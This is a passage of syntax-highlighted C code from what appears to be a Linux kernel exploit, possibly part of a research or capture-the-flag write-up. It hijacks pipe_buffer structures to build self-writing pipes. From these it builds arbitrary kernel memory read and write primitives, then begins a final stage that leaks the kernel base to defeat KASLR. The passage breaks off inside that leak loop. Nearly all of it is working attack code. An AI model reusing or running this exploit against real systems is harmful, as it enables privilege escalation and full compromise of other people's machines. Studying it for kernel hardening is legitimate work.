<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>ops</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>ops</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>flags</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>flags</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>private</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>private</span><span class=p>;</span>

<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_pipe_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* check for third-level victim pipe */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=w> </span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_vicitm_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>page_ptr</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>page_ptr</span><span class=p>));</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>page_ptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>self_2nd_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found self-writing pipe: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;\%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span>
<span class=w>                   </span><span class=n>self_2nd_pipe_pid</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>self_2nd_pipe_pid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to build a self-writing pipe!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* overwrite the 3rd pipe_buffer to this page too */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>

<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=n>buf</span><span class=p>,</span><span class=n>TRD_PIPE_BUF_SZ</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_pipe_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_pipe_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* check for third-level victim pipe */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=w> </span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_vicitm_pid</span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>self_2nd_pipe_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>page_ptr</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>page_ptr</span><span class=p>));</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>page_ptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>self_3rd_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found another self-writing pipe: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>                   </span><span class=n>self_3rd_pipe_pid</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>self_3rd_pipe_pid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to build a self-writing pipe!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* overwrite the 4th pipe_buffer to this page too */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>

<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=n>buf</span><span class=p>,</span><span class=n>TRD_PIPE_BUF_SZ</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_pipe_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>snd_vicitm_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_pipe_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* check for third-level victim pipe */</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PIPE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>victim_pid</span><span class=w> </span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>snd_vicitm_pid</span>
<span class=w>            </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>self_2nd_pipe_pid</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>i</span><span class=o>==</span><span class=w> </span><span class=n>self_3rd_pipe_pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=k>continue</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>page_ptr</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>page_ptr</span><span class=p>));</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>page_ptr</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>evil_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>self_4th_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>SUCCESS_MSG</span><span class=p>(</span><span class=s>&quot;[+] Found another self-writing pipe: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span>
<span class=w>                   </span><span class=n>self_4th_pipe_pid</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>self_4th_pipe_pid</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>-1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>err_exit</span><span class=p>(</span><span class=s>&quot;FAILED to build a self-writing pipe!&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;&quot;</span><span class=p>);</span>
<span class=p>}</span>

<span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=n>evil_2nd_buf</span><span class=p>,</span><span class=w> </span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=w> </span><span class=n>evil_4th_buf</span><span class=p>;</span>
<span class=kt>char</span><span class=w> </span><span class=n>temp_zero_buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>]</span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=sc>&#39;\0&#39;</span><span class=w> </span><span class=p>};</span>

<span class=cm>/**</span>
<span class=cm> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span>
<span class=cm> * We need to build a circle there for continuously memory seeking:</span>
<span class=cm> * - 2nd pipe to search</span>
<span class=cm> * - 3rd pipe to change 4th pipe</span>
<span class=cm> * - 4th pipe to change 2nd and 3rd pipe</span>
<span class=cm>**/</span>
<span class=kt>void</span><span class=w> </span><span class=nf>setup_evil_pipe</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span>
<span class=w>    </span><span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>evil_2nd_buf</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>info_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>info_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_3rd_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>evil_4th_buf</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>info_pipe_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_4th_buf</span><span class=p>));</span>

<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0xff0</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* hijack the 3rd pipe pointing to 4th */</span>
<span class=w>    </span><span class=n>evil_3rd_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>3</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_3rd_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_3rd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=n>evil_4th_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_4th_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>ssize_t</span><span class=w> </span><span class=nf>arbitrary_read_by_pipe</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=w> </span><span class=o>*</span><span class=n>page_to_read</span><span class=p>,</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>dst</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/* page to read */</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1ff8</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>page_to_read</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* hijack the 4th pipe pointing to 2nd pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_3rd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_4th_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_4th_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 2nd pipe for arbitrary read */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_2nd_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span>
<span class=w>          </span><span class=n>temp_zero_buf</span><span class=p>,</span><span class=w> </span>
<span class=w>          </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 3rd pipe to point to 4th pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_3rd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* read out data */</span>
<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_2nd_pipe_pid</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=n>dst</span><span class=p>,</span><span class=w> </span><span class=mh>0xfff</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span><span class=w> </span><span class=nf>arbitrary_write_by_pipe</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=w> </span><span class=o>*</span><span class=n>page_to_write</span><span class=p>,</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>src</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>len</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/* page to write */</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>page_to_write</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=w>    </span><span class=n>evil_2nd_buf</span><span class=p>.</span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* hijack the 4th pipe pointing to 2nd pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_3rd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_4th_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_4th_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_2nd_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span>
<span class=w>          </span><span class=n>temp_zero_buf</span><span class=p>,</span><span class=w> </span>
<span class=w>          </span><span class=n>TRD_PIPE_BUF_SZ</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_2nd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* hijack the 3rd pipe to point to 4th pipe */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_4th_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>evil_3rd_buf</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>evil_3rd_buf</span><span class=p>));</span>

<span class=w>    </span><span class=cm>/* write data into dst page */</span>
<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>self_2nd_pipe_pid</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>src</span><span class=p>,</span><span class=w> </span><span class=n>len</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * VII - FINAL exploit stage with arbitrary read &amp; write</span>
<span class=cm>*/</span>

<span class=kt>size_t</span><span class=w> </span><span class=o>*</span><span class=n>tsk_buf</span><span class=p>,</span><span class=w> </span><span class=n>current_task_page</span><span class=p>,</span><span class=w> </span><span class=n>current_task</span><span class=p>,</span><span class=w> </span><span class=n>parent_task</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>


<span class=kt>void</span><span class=w> </span><span class=nf>info_leaking_by_arbitrary_pipe</span><span class=p>()</span>
<span class=p>{</span>
<span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=o>*</span><span class=n>comm_addr</span><span class=p>;</span>
<span class=w>    </span><span class=kt>ssize_t</span><span class=w> </span><span class=n>rlen</span><span class=p>;</span>

<span class=w>    </span><span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=n>setup_evil_pipe</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * KASLR&#39;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span>
<span class=cm>     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span>
<span class=cm>     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span>
<span class=cm>     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span>
<span class=cm>     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span>
<span class=cm>     * </span>
<span class=cm>     * What&#39;s more is that, if we couldn&#39;t read the memory while looping,</span>
<span class=cm>     * it means that we&#39;ve just locate with 256MB in front of the vmemmap_base,</span>
<span class=cm>     * therefore we can add the KASLR_GRANULARITY back and get the real base.</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>.</span><span class=n>page</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>KASLR_MASK</span><span class=p>;</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(;;)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>rlen</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>arbitrary_read_by_pipe</span><span class=p>(</span>
<span class=w>            </span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>page</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>157</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mh>0x40</span><span class=p>),</span>
<span class=w>            </span><span class=n>buf</span>
<span class=w>        </span><span class=p>);</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>buf</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>KERNEL_BASE</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>((</span><span class=n>buf</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0xfff</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mh>0x100</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>kernel_base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=n>PAGE_MASK</span><span class=p>;</span>
<span class=w>            </span><span class=n>kernel_offset</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>kernel_base</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>KERNEL_BASE</span><span class=p>;</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;</span><span class=se>\033</span><span class=s>[32m</span><span class=se>\033</span><span class=s>[1m[+] Found kernel base: </span><span class=se>\033</span><span class=s>[0m0x%lx</span><span class=se>\n</span><span class=s>&quot;</span>
<span class=w>                   </span><span class=s>&quot;</span><span class=se>\033</span><span class=s>[32m</span><span class=se>\033</span><span class=s>[1m[+] Kernel offset: </span><span class=se>\033</span><span class=s>[0m0x%lx</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span>
<span class=w>                   </span><span class=n>kernel_base</span><span class=p>,</span><span class=w> </span><span class=n>kernel_offset</span><span class=p>);</span>
<span class=w>            </span><span class=k>break</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>rlen</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>vmemmap_base</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>KASLR_GRANULARITY</span><span class=p>;</span>
